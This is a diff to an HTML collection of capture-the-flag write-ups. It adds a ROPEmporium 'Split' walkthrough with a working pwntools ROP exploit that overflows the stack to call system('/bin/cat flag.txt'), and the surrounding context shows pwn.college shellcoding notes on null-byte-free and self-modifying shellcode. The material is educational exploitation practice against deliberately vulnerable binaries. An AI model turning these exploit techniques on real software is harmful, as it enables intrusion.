@@ -739,7 +739,45 @@ io.sendlineafter(b&quot;:&quot;, pwn.flat({PADDING: [ret, rop.chain()]}))
 io.interactive()
 </code></pre>
 <p>Running it either locally or remotely on a vulnerable machine drops us a shell, you can read the flag in the flag.txt file ! Hopefully you enjoyed the challenge and the writeup.</p>
-<div style="break-before: page; page-break-before: always;"></div><h1 id="2---split"><a class="header" href="#2---split">2 - Split</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="ropemporium-split"><a class="header" href="#ropemporium-split">ROPEmporium (Split)</a></h1>
+<p>Split is the second challenge of the ROPemporium series on binary exploitation, it's a pretty simple challenge that just require you to make a system call using the address of the string &quot;/bin/cat flag.txt&quot;, to find this string you can just look at the different functions the binary has and you should see one called <code>usefulString</code>, this symbol should contain the string we want.</p>
+<p>For this challenge we will heavily rely on pwntools, python and gdb, although the challenge is pretty simple (took me 5 mins to solve) i think it's pretty educative on how to rop properly.</p>
+<h2 id="solving-the-challenge-3"><a class="header" href="#solving-the-challenge-3">Solving the Challenge</a></h2>
+<p>Looking at the <a href="https://ropemporium.com/challenge/split.html">ROPEmporium Website</a> we are given the following instructions.</p>
+<pre><code>Still here
+
+I'll let you in on a secret: that useful string &quot;/bin/cat flag.txt&quot; is still present in this binary, as is a call to system(). It's just a case of finding them and chaining them together to make the magic happen. 
+</code></pre>
+<p>We know there is the string &quot;/bin/cat flag.txt&quot; in the binary, and we can easily make a system call since the function is present in the binary.</p>
+<pre><code class="language-py">import pwn
+
+pwn.context.arch = &quot;amd64&quot;
+e = pwn.ELF(&quot;./split&quot;)
+
+def find_eip(payload):
+    io = pwn.process(e.path)
+    io.sendlineafter(b&quot;&gt; &quot;, payload)
+    io.wait()
+    rip_offset = pwn.cyclic_find(io.corefile.read(io.corefile.rsp, 4))
+    pwn.log.info(&quot;Located RIP offset at {a}&quot;.format(a=rip_offset))
+    return rip_offset
+
+pop_rdi_ret = pwn.p64(0x4007c3)
+offset = find_eip(pwn.cyclic(100))
+io = pwn.process(e.path)
+rop = pwn.ROP(e)
+rop.system(e.symbols.usefulString)
+
+payload = [
+    b&quot;A&quot;*offset,
+    rop.chain(),
+    pop_rdi_ret
+]
+
+io.sendlineafter(b&quot;&gt; &quot;, b&quot;&quot;.join(payload))
+io.interactive()
+</code></pre>
+<p>Running the following script should automatically find the crash offset and it will call system(&quot;/bin/cat flag.txt&quot;).</p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="anatomy-of-a-gopher"><a class="header" href="#anatomy-of-a-gopher">Anatomy of a Gopher</a></h1>
 <p>This sections are my notes relating the SANS talk &quot;Anatomy of a Gopher&quot;, by hex0punk (Alex Useche). The talk is still available on youtube at the following link <a href="%22https://www.youtube.com/watch?v=wWNbnEp_4ZE%22">talk</a>.</p>
 <h2 id="what-are-we-doing"><a class="header" href="#what-are-we-doing">What are we doing</a></h2>
@@ -988,7 +1026,7 @@ MOV instructions.</p>
 </code></pre>
 <p>What we're doing is basically <em>masking</em> a number by <strong>AND'ing</strong> with (2 ** n bits we want to access - 1) and this does the same result as doing modulo on (2 ** n bits we want to access).</p>
 <p>Let's put this in practice and complete the challenge</p>
-<h2 id="solving-the-challenge-3"><a class="header" href="#solving-the-challenge-3">Solving the Challenge</a></h2>
+<h2 id="solving-the-challenge-4"><a class="header" href="#solving-the-challenge-4">Solving the Challenge</a></h2>
 <p>Okay so completing the challenge was pretty simple, we are asked to do the following :</p>
 <pre><code>Welcome to EmbryoASMLevel6
 ==================================================
@@ -1053,7 +1091,7 @@ _start:
 <p>I highly hope you have a great understanding of syscalls so far, if not i highly recommend you go read <a href="https://man7.org/tlpi/">The Linux Programming Interface</a> and <a href="https://www.oreilly.com/library/view/understanding-the-linux/0596005652/">Understanding the Linux Kernel, 3rd Edition</a>.</p>
 <p>We will highly rely on syscalls on this module since it's pretty much the only thing we have at hands, we will rely specifically on <strong>sys_open</strong>, <strong>sys_sendfile</strong> and <strong>sys_exit</strong>.</p>
 <p>As it looks pretty obvious, we will first <strong>open</strong> the file (file descriptor), <strong>sendfile</strong> to read the content of that file and send its output to a file descriptor and then <strong>exit</strong> the program cleanly.</p>
-<h2 id="solving-the-challenge-4"><a class="header" href="#solving-the-challenge-4">Solving the Challenge</a></h2>
+<h2 id="solving-the-challenge-5"><a class="header" href="#solving-the-challenge-5">Solving the Challenge</a></h2>
 <p>I think we're ready to start writing shellcode, for this we will write a <strong>.s</strong> (source) file, compile it with gcc (<strong>gcc -nostdlib -static solve.s solve</strong>) and extract the <strong>.text</strong> section code (our shellcode), into another file (<strong>objcopy --dump-section .text=shellcode solve</strong>).</p>
 <pre><code class="language-x86asm">.global _start
 _start:
@@ -1082,7 +1120,7 @@ flag:
 <p>Execute the program with our ./shellcode redirected to stdin and we should win this challenge :)</p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="babyshell-level-3"><a class="header" href="#babyshell-level-3">Babyshell Level 3</a></h1>
 <p>Babyshell level 3 is the third challenge from pwn.college shellcoding module, it is pretty simple if you have watched the <a href="https://www.youtube.com/watch?v=715v_-YnpT8&amp;t=1968s">videos for the module</a>.</p>
-<h2 id="solving-the-challenge-5"><a class="header" href="#solving-the-challenge-5">Solving The Challenge</a></h2>
+<h2 id="solving-the-challenge-6"><a class="header" href="#solving-the-challenge-6">Solving The Challenge</a></h2>
 <p>Solving the challenge is pretty straight forward, we need to remove all null bytes from our shellcode, if there is any null bytes in our shellcode the program will fail.</p>
 <p>The challenge took me a couple hours to solve since i had to find instructions that doesn't contains any null bytes in their opcode, i found the following informations :
 - a lot of time <strong>mov</strong> instructions have null bytes in their opcode, however with <strong>rbx</strong> that was not the case, so i used <strong>rbx</strong> a little in the final solution <strong>instead of directly moving the value &quot;/flag&quot; into rdi</strong>.
@@ -1196,7 +1234,7 @@ flag{fake_flag_for_testing}
 <p>:)</p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="babyshell-level-4"><a class="header" href="#babyshell-level-4">Babyshell Level 4</a></h1>
 <p>This challenge was a bit like the last one, but this time the filter checks for the byte 0x48, so we need to test different registers to see which cause the opcode 0x48 and which register doesn't.</p>
-<h2 id="solving-the-challenge-6"><a class="header" href="#solving-the-challenge-6">Solving The Challenge</a></h2>
+<h2 id="solving-the-challenge-7"><a class="header" href="#solving-the-challenge-7">Solving The Challenge</a></h2>
 <p>So we are going to start looking at every restriction on the current instruction in our program, since the challenge is pretty much the same we can just take the same shellcode we used in the precedent level and objdump it, this way we can see where our shellcode can potentially fail and which instructions we need to fix.</p>
 <p>Also you can use the pwn.asm() functions instead of compiling the code and checking with objdump.</p>
 <p>Those are the following restrictions on instructions i've had to deal with during the course of this challenge :</p>
@@ -1348,7 +1386,7 @@ flag{fake_flag_for_testing}
 <p>Annnnnd we did bypass the filter, it was pretty easy and nice to solve, if you had problems doing it on your own remember you can write programs to test instructions and dump their opcode using the objdump -D switch. :)</p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="babyshell-level-5"><a class="header" href="#babyshell-level-5">Babyshell Level 5</a></h1>
 <p>Okay ! Now we are talking, this challenge was a little bit harder than the previous one, but was really fun to solve. Itried to solved it for like 3 hours before i quitted and the next day i was able to complete it on my own.</p>
-<h2 id="solving-the-challenge-7"><a class="header" href="#solving-the-challenge-7">Solving the Challenge</a></h2>
+<h2 id="solving-the-challenge-8"><a class="header" href="#solving-the-challenge-8">Solving the Challenge</a></h2>
 <p><strong>What is the task :</strong> We need to write a shellcode that does not contains any <strong>syscall</strong> (0x0f05), <strong>sysenter</strong> (0x0f34) or <strong>int</strong> (0x80cd) opcodes in our shellcode, this makes it a LOT harder for us to call into the kernel since we n eed to write <strong>self-modifying code</strong>, for this challenge we will heavily rely on labels, make sure you know what they  are before jumping into this !</p>
 <p>So, after a bit of researching on how i could write this &quot;self-modifying&quot; shellcode, i found on discord that we could use a label for that, we are going to put <strong>.word</strong> values in our labels, with the value of 0x0000, however when the program will run, it will modify the value of our <strong>.word</strong> in the label for the syscall opcode, and we can just call the location of [rip+label] to execute the syscall instructions, let's start writing code :</p>
 <pre><code class="language-x86asm">.global _start
